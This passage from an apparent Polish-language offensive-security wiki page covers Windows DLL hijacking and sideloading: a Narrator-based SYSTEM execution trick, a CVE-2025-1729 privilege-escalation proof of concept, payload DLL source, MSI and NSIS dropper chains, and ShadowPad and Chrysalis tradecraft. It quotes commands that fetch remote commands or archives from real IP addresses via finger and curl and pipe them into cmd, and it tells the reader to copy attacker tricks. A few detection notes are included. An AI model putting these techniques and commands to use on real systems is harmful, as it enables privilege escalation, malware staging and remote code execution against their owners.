- Zezwól na klasyczną warstwę bezpieczeństwa RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się przez RDP z hostem, na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; twoja DLL wykona się jako SYSTEM na secure desktop.
- Wykonanie zatrzymuje się po zamknięciu sesji RDP—wstrzyknij/migruj niezwłocznie.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wbudowany wpis rejestru Accessibility Tool (AT) (np. CursorIndicator), zmodyfikować go tak, aby wskazywał na dowolny binary/DLL, zaimportować go, a następnie ustawić `configuration` na tę nazwę AT. To pośredniczy w dowolnym wykonaniu kodu w ramach frameworka Accessibility.

Uwagi
- Zapis do `%windir%\System32` i zmiana wartości HKLM wymaga uprawnień admin.
- Cała logika payload może działać w `DLL_PROCESS_ATTACH`; eksporty nie są potrzebne.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

To case study pokazuje **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzony jako **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` znajdujący się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 AM w kontekście zalogowanego użytkownika.
- **Directory Permissions**: Zapis możliwy przez `CREATOR OWNER`, co pozwala lokalnym użytkownikom podkładać dowolne pliki.
- **DLL Search Behavior**: Próbuje załadować `hostfxr.dll` najpierw z własnego katalogu roboczego i zapisuje "NAME NOT FOUND", jeśli plik nie istnieje, co wskazuje na pierwszeństwo wyszukiwania w lokalnym katalogu.

### Exploit Implementation

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakującą DLL do uzyskania wykonania kodu w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Jako standard user, umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 AM w kontekście bieżącego usera.
3. Jeśli administrator jest zalogowany, gdy task zostanie wykonany, złośliwy DLL uruchomi się w sesji administratora z medium integrity.
4. Połącz standardowe techniki UAC bypass, aby podnieść uprawnienia z medium integrity do uprawnień SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors często łączą droppers oparte na MSI z DLL side-loading, aby uruchomić payload under zaufanym, signed process.

Chain overview
- User pobiera MSI. CustomAction uruchamia się po cichu podczas GUI install (np. LaunchApplication lub akcja VBScript), odtwarzając następny stage z osadzonych resources.
- Dropper zapisuje legalny, signed EXE i złośliwy DLL do tego samego katalogu (przykładowa para: Avast-signed wsc_proxy.exe + kontrolowany przez attacker wsc.dll).
- Gdy signed EXE zostanie uruchomiony, Windows DLL search order ładuje wsc.dll najpierw z working directory, wykonując code attacker under signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Szukaj wpisów, które uruchamiają executables lub VBScript. Przykład podejrzanego pattern: LaunchApplication uruchamiające osadzony plik w tle.
- W Orca (Microsoft Orca.exe), sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Embedded/split payloads w MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Albo użyj lessmsi: lessmsi x package.msi C:\out
- Szukaj wielu małych fragmentów, które są łączone i decryptowane przez VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczne sideloading z wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: legalnie podpisany host (Avast). Proces próbuje załadować wsc.dll po nazwie z własnego katalogu.
- wsc.dll: DLL atakującego. Jeśli nie są wymagane konkretne eksporty, DllMain może wystarczyć; w przeciwnym razie zbuduj proxy DLL i przekieruj wymagane eksporty do prawdziwej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny payload DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- W przypadku wymagań export, użyj frameworka proxying (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, który dodatkowo wykona Twój payload.

- Ta technika opiera się na resolution nazw DLL przez host binary. Jeśli host używa absolute paths albo safe loading flags (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie udać.
- KnownDLLs, SxS i forwarded exports mogą wpływać na precedence i trzeba je uwzględnić podczas wyboru host binary oraz export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point opisał, jak Ink Dragon wdraża ShadowPad, używając **trzypliku triady**, aby wtapiać się w legalne oprogramowanie, jednocześnie trzymając core payload zaszyfrowany na dysku:

1. **Signed host EXE** – nadużywane są vendorzy tacy jak AMD, Realtek albo NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę executable tak, aby wyglądał jak Windows binary (na przykład `conhost.exe`), ale podpis Authenticode pozostaje poprawny.
2. **Malicious loader DLL** – wrzucany obok EXE pod oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL to zwykle binary MFC obfuskowany frameworkiem ScatterBrain; jego jedynym zadaniem jest znaleźć zaszyfrowany blob, odszyfrować go i reflectively załadować ShadowPad.
3. **Encrypted payload blob** – często przechowywany jako `<name>.tmp` w tym samym katalogu. Po memory-mapping odszyfrowanego payload, loader usuwa plik TMP, aby zniszczyć dowody forensic.

Tradecraft notes:

* Zmiana nazwy signed EXE (przy zachowaniu oryginalnego `OriginalFileName` w PE header) pozwala mu udawać Windows binary, a jednocześnie zachować podpis vendor, więc warto naśladować zwyczaj Ink Dragon polegający na wrzucaniu binarek wyglądających jak `conhost.exe`, które tak naprawdę są narzędziami AMD/NVIDIA.
* Ponieważ executable pozostaje trusted, większość kontroli allowlisting potrzebuje tylko, aby Twój malicious DLL leżał obok niego. Skup się na dostosowaniu loader DLL; podpisany parent zwykle może działać bez zmian.
* ShadowPad decryptor oczekuje, że blob TMP będzie leżał obok loadera i będzie writable, aby można było wyzerować plik po mapowaniu. Zostaw katalog writable do momentu załadowania payload; gdy będzie już w pamięci, plik TMP można bezpiecznie usunąć dla OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS, więc jedynym własnym artefaktem na dysku jest malicious DLL obok trusted EXE:

- **Remote command loader (Finger):** Ukryty PowerShell uruchamia `cmd.exe /c`, pobiera komendy z Finger server i przekazuje je do `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` pobiera tekst TCP/79; `| cmd` wykonuje odpowiedź servera, co pozwala operatorom rotować drugi etap po stronie serwera.

- **Built-in download/extract:** Pobierz archiwum z benign extension, rozpakuj je i przygotuj target sideload plus DLL w losowym folderze `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ukrywa postęp i podąża za przekierowaniami; `tar -xf` używa wbudowanego w Windows tar.

- **WMI/CIM launch:** Uruchom EXE przez WMI, aby telemetry pokazała proces utworzony przez CIM, podczas gdy ładuje on współlokowany DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Działa z binarkami, które preferują local DLLs (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) działa pod zaufaną nazwą.

- **Hunting:** Alarmuj na `forfiles`, gdy `/p`, `/m` i `/c` pojawiają się razem; to rzadkie poza admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Niedawna intruzja Lotus Blossom nadużyła zaufanego update chain, aby dostarczyć NSIS-packed dropper, który przygotował DLL sideload oraz payloady w pełni w pamięci.

Tradecraft flow
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go jako **HIDDEN**, wrzuca przemianowany Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` oraz zaszyfrowany blob `BluetoothService`, a następnie uruchamia EXE.
- Host EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` mmap-loaduje blob; `LogWrite` odszyfrowuje go przy użyciu custom stream opartego na LCG (stałe **0x19660D** / **0x3C6EF35F**, key material wyprowadzony z poprzedniego hash), nadpisuje buffer plaintext shellcode, zwalnia temps i skacze do niego.
- Aby uniknąć IAT, loader rozwiązuje API przez hashing nazw exportów używając **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, a następnie stosując Murmur-style avalanche (**0x85EBCA6B**) i porównując z salted target hashes.

Main shellcode (Chrysalis)
- Odszyfrowuje PE-like main module przez powtarzanie add/XOR/sub z kluczem `gQ2JR&9;` w pięciu passach, a następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć import resolution.
- Odtwarza strings nazw DLL w runtime poprzez per-character bit-rotate/XOR transforms, a następnie ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego resolvera, który przechodzi po **PEB → InMemoryOrderModuleList**, parsuje każdą export table w blokach 4-byte z Murmur-style mixing i tylko wtedy wraca do `GetProcAddress`, jeśli hash nie zostanie znaleziony.

Embedded configuration & C2
- Config znajduje się wewnątrz wrzuconego pliku `BluetoothService` pod **offset 0x30808** (size **0x980**) i jest odszyfrowany RC4 kluczem `qwhvb^435h&*7`, ujawniając C2 URL i User-Agent.
- Beacons budują profil hosta rozdzielany kropkami, dodają tag `4Q`, a następnie szyfrują RC4 kluczem `vAuig34%^325hGV` przed `HttpSendRequestA` przez HTTPS. Responses są odszyfrowywane RC4 i dispatchowane przez tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode jest kontrolowany przez CLI args: bez args = install persistence (service/Run key) wskazujące na `-i`; `-i` uruchamia ponownie siebie z `-k`; `-k` pomija instalację i uruchamia payload.

Alternate loader observed
- Ta sama intruzja wrzuciła Tiny C Compiler i uruchomiła `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, z `libtcc.dll` obok. C source dostarczony przez atakującego zawierał embedded shellcode, kompilował go i uruchamiał w pamięci bez dotykania dysku z PE. Odtwórz z:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ta oparta na TCC faza compile-and-run załadowała `Wininet.dll` w czasie działania i pobrała shellcode drugiego etapu z hardcoded URL, dając elastyczny loader, który podszywa się pod uruchomienie kompilatora.

## Signed-host sideloading with export proxying + host thread parking

Niektóre łańcuchy DLL sideloading dodają **stability engineering**, aby legalny host pozostawał aktywny wystarczająco długo, by poprawnie załadować późniejsze etapy, zamiast crashować po załadowaniu złośliwej DLL.

Obserwowany wzorzec
- Umieść zaufany EXE obok złośliwej DLL, używając oczekiwanej nazwy zależności, takiej jak `version.dll`.
- Złośliwa DLL **proxyuje każdy oczekiwany export** do prawdziwej systemowej DLL (na przykład `%SystemRoot%\\System32\\version.dll`), dzięki czemu resolution importów nadal się udaje, a proces hosta nadal działa.
- Po załadowaniu złośliwa DLL **patchuje entry point hosta**, aby główny wątek wpadał w nieskończoną pętlę `Sleep` zamiast kończyć działanie lub uruchamiać ścieżki kodu, które zakończyłyby proces.
- Nowy wątek wykonuje właściwe złośliwe działania: odszyfrowuje nazwę lub path DLL następnego etapu (RC4/XOR są częste), a następnie uruchamia ją za pomocą `LoadLibrary`.

Dlaczego to ma znaczenie
- Zwykłe proxying DLL zachowuje kompatybilność API, ale nie gwarantuje, że host pozostanie aktywny wystarczająco długo dla późniejszych etapów.
- Uśpienie głównego wątku w `Sleep(INFINITE)` to prosty sposób na utrzymanie podpisanego procesu w pamięci, podczas gdy loader wykonuje odszyfrowywanie, staging lub network bootstrap w wątku roboczym.
- Szukanie tylko podejrzanego `DllMain` może przegapić ten wzorzec, jeśli interesujące zachowanie pojawia się dopiero po spatchowaniu entry point hosta i uruchomieniu dodatkowego wątku.

Minimal workflow
1. Skopiuj podpisany host EXE i ustal, jaką DLL rozwiązuje z lokalnego katalogu.
2. Zbuduj proxy DLL eksportujące te same funkcje i przekazujące je do legalnej DLL.
3. W `DllMain(DLL_PROCESS_ATTACH)` utwórz wątek roboczy.
4. Z tego wątku spatchuj entry point hosta lub główną procedurę startową tak, aby zapętlała się na `Sleep`.
5. Odszyfruj nazwę/config DLL następnego etapu i wywołaj `LoadLibrary` albo załaduj payload manual-map.

Punkty obronne
- Podpisane procesy ładujące `version.dll` lub podobne, często używane biblioteki z własnego katalogu aplikacji zamiast z `System32`.
- Modyfikacje pamięci w entry point procesu krótko po image load, zwłaszcza skoki/wywołania przekierowane do `Sleep`/`SleepEx`.
- Wątki tworzone przez proxy DLL, które natychmiast wywołują `LoadLibrary` na drugiej DLL z odszyfrowaną nazwą.
- Pełne proxy DLL umieszczone obok vendor executables w zapisywalnych katalogach staging, takich jak `ProgramData`, `%TEMP%` lub rozpakowane ścieżki archiwów.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
